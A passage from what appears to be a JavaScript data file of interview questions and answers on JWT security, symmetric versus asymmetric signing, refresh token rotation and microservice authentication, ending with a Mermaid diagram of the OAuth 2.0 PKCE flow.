<li><strong>Storage</strong>: Never localStorage (XSS-accessible). Prefer httpOnly secure cookies (for traditional apps) or in-memory only (for SPAs with short-lived tokens).</li>
<li><strong>Validation</strong>: Always verify signature, issuer, audience, expiry, and algorithm. Pin allowed algorithms \u2014 never trust the token's alg header blindly.</li>
<li><strong>Payload is NOT secret</strong>: Never put sensitive data in JWT payload (it is only Base64-encoded, not encrypted).</li>
<li><strong>Revocation</strong>: JWTs cannot be revoked before expiry without additional infrastructure (denylist, short lifetimes + refresh rotation).</li>
</ul>`,
            interviewTip: 'Emphasize two critical points: (1) JWT payload is encoded, NOT encrypted \u2014 anyone can read it, and (2) JWTs are stateless so they cannot be revoked before expiry without extra infrastructure. These are the two gotchas interviewers consistently probe for.',
            followUp: ['Where should a SPA store access tokens?', 'What is the alg:none attack?', 'How do you handle JWT revocation?'],
            seniorPerspective: 'For SPAs I keep access tokens in memory only (not localStorage) with short lifetimes (5-15 min), and use refresh token rotation via httpOnly cookies or a BFF pattern. The key insight is that JWTs trade revocability for scalability \u2014 short lifetimes bound the exposure window.',
            architectPerspective: 'JWTs are an architectural trade-off: stateless validation scales horizontally but sacrifices instant revocation. I design around this by keeping access tokens very short-lived (minutes), using refresh rotation for session continuity, and implementing a token denylist at the gateway only for high-assurance operations where immediate revocation is non-negotiable.'
        },
        {
            question: 'Explain the difference between symmetric (HS256) and asymmetric (RS256) JWT signing. When to use each?',
            difficulty: 'hard',
            answer: `<p><strong>Symmetric (HS256)</strong>: Uses the same shared secret for both signing AND verification. Both the issuer and every verifier must possess the secret.</p>
<p><strong>Asymmetric (RS256/ES256)</strong>: Uses a private key to sign and a public key to verify. Only the issuer needs the private key; verifiers only need the public key (available via JWKS endpoint).</p>
<ul>
<li><strong>Use HS256 when</strong>: the issuer and verifier are the same system (monolith, single service). Simpler, faster, but the secret must be shared and rotated carefully.</li>
<li><strong>Use RS256/ES256 when</strong>: multiple services verify tokens from a central IdP. Each service fetches the public key from the JWKS endpoint \u2014 no secret distribution needed. This is the standard for microservices and external IdPs (Auth0, Azure AD, Keycloak).</li>
</ul>
<p><strong>Security consideration</strong>: The algorithm-confusion attack occurs when a verifier accepts HS256 using the public key as the secret. An attacker signs a token with the (public) key using HS256, and the server validates it. Always pin the expected algorithm.</p>`,
            interviewTip: 'The key insight: symmetric requires secret sharing with every verifier (does not scale), while asymmetric only requires public key distribution (scales to many services). Name the algorithm-confusion attack as the reason you must pin ValidAlgorithms and never trust the token header.',
            followUp: ['What is the algorithm-confusion attack and how do you prevent it?', 'How does the JWKS endpoint work for key rotation?', 'Why is ES256 preferred over RS256 for new systems?'],
            seniorPerspective: 'I exclusively use RS256 or ES256 for multi-service architectures because it eliminates secret distribution \u2014 each service only needs the public JWKS endpoint URL. I also always pin ValidAlgorithms in token validation to prevent algorithm-confusion, which is a textbook vulnerability that still appears in production.',
            architectPerspective: 'Asymmetric signing is the only sane choice for distributed systems: the IdP owns the private key, every service validates with the public key from JWKS, and key rotation happens transparently. This decouples token issuance from validation \u2014 adding a new service requires zero coordination with the IdP beyond trusting its issuer URL.'
        },
        {
            question: 'How do you implement token refresh with rotation? What is refresh token reuse detection?',
            difficulty: 'advanced',
            answer: `<p><strong>Token refresh with rotation</strong> issues a new refresh token on every use and invalidates the previous one. Tokens are linked in a <em>family</em> (lineage) tied to the original authentication event.</p>
<p><strong>Reuse detection</strong>: If a previously-used (rotated-out) refresh token is presented again, the system treats it as a compromise signal and revokes the entire token family, forcing re-authentication for all sessions in that lineage.</p>
<p>Implementation:</p>
<ol>
<li>Client presents refresh token to get new access + refresh tokens.</li>
<li>Server marks the presented token as used, issues a new pair, links them to the same family.</li>
<li>If a used token is presented again: attacker or legitimate client has a stale token \u2192 revoke entire family.</li>
<li>Both attacker and legitimate user must re-authenticate \u2014 bounded blast radius.</li>
</ol>
<p>This limits damage: a stolen refresh token can only be used once before either the thief or the victim triggers reuse detection and kills the session.</p>`,
            interviewTip: 'The high-signal detail is explaining WHY reuse detection works: if an attacker uses the stolen token first, the legitimate client triggers revocation on next use (and vice versa). Either way, the compromise is detected and bounded \u2014 that is the security guarantee.',
            followUp: ['How do you handle benign retries that might trigger false reuse detection?', 'What is the difference between absolute and sliding expiration for token families?', 'Where should refresh tokens be stored in a SPA?'],
            seniorPerspective: 'The production subtlety is benign reuse from network retries. I add a short grace window (5-10 seconds) where the same token can be redeemed again returning the same new pair, to avoid false-positive family revocation from legitimate client retries over flaky networks.',
            architectPerspective: 'Refresh rotation reintroduces state into a stateless token system, making the token store a critical-path dependency with the same availability requirements as the auth service. I design it as a lightweight, high-availability store (Redis with replication) and treat the family-revocation event as a security signal that feeds into anomaly detection.'
        },
        {
            question: 'Design an authentication system for a microservices architecture with 50+ services. How do you propagate identity?',
            difficulty: 'expert',
            answer: `<p>For a 50+ service architecture, authentication must be <strong>centralized for issuance, distributed for validation</strong>:</p>
<ol>
<li><strong>Central Identity Provider (IdP)</strong>: Single source of truth for authentication (Keycloak, Azure AD, Auth0). Issues JWTs with asymmetric signing (RS256/ES256). All user login flows terminate here.</li>
<li><strong>Token Format</strong>: Short-lived access tokens (5-15 min) as JWTs containing identity claims (sub, roles, tenant). Services validate locally using the public JWKS \u2014 no per-request call to the IdP.</li>
<li><strong>Identity Propagation</strong>: Services pass the JWT downstream in the Authorization header. Each service validates independently and extracts claims for authorization. For async (message queues), embed a correlation token or user context claim in the message envelope.</li>
<li><strong>Service-to-Service</strong>: Client Credentials flow for machine identity. Each service has its own client_id. Use mutual TLS (mTLS) or service mesh identity (Istio/Linkerd) for zero-trust service authentication.</li>
<li><strong>API Gateway</strong>: Terminates external auth, validates tokens at the edge, passes identity downstream. Rate limiting, token exchange, and scope enforcement happen here.</li>
<li><strong>Token Exchange</strong>: When Service A calls Service B on behalf of a user, use OAuth token exchange (RFC 8693) to get a scoped token for Service B \u2014 principle of least privilege.</li>
</ol>`,
            interviewTip: 'Structure as: one IdP (centralized issuance) + JWTs with asymmetric signing (distributed validation) + gateway for edge enforcement + mTLS for service mesh + token exchange for delegation. This shows you understand the scalability and security trade-offs at each layer.',
            followUp: ['How do you handle token revocation across 50 services?', 'What is OAuth token exchange and when is it needed?', 'How does a service mesh handle service identity differently from JWTs?'],
            seniorPerspective: 'The critical decisions are: (1) short access tokens so revocation lag is bounded, (2) JWKS-based validation so services scale independently of the IdP, (3) a shared claims schema so every service interprets identity consistently, and (4) a gateway that handles the complex auth flows so individual services only need simple token validation.',
            architectPerspective: 'At 50+ services, authentication is infrastructure, not a feature. I build it as a platform capability: the IdP, JWKS distribution, token exchange, and mTLS are provided by the platform team. Service teams consume a thin SDK that validates tokens and extracts claims \u2014 they never implement auth logic. This scales because adding a service is just registering it with the IdP and deploying the standard auth middleware.'
        }
    ],
    sections_mermaid: [
        {
            title: 'OAuth 2.0 Authorization Code + PKCE Flow',
            content: `<p>Sequence diagram showing the complete OAuth 2.0 Authorization Code flow with PKCE for SPAs and mobile apps.</p>`,
            diagram: `sequenceDiagram
    participant User
    participant SPA as SPA/Mobile App
    participant IdP as Identity Provider
    participant API as Resource Server

    SPA->>SPA: Generate code_verifier + code_challenge (SHA-256)
    SPA->>IdP: GET /authorize?response_type=code&code_challenge=X&method=S256
    IdP->>User: Show login page
    User->>IdP: Enter credentials + MFA
    IdP->>SPA: Redirect with authorization_code
    SPA->>IdP: POST /token (code + code_verifier)
    IdP->>IdP: Verify SHA256(code_verifier) == code_challenge
    IdP->>SPA: access_token (JWT) + refresh_token + id_token
    SPA->>API: GET /resource (Authorization: Bearer access_token)
    API->>API: Validate JWT (signature, iss, aud, exp)
    API->>SPA: 200 OK (resource data)
    Note over SPA,IdP: On token expiry: use refresh_token to get new access_token`,
            diagramType: 'mermaid'
        }
    ]
});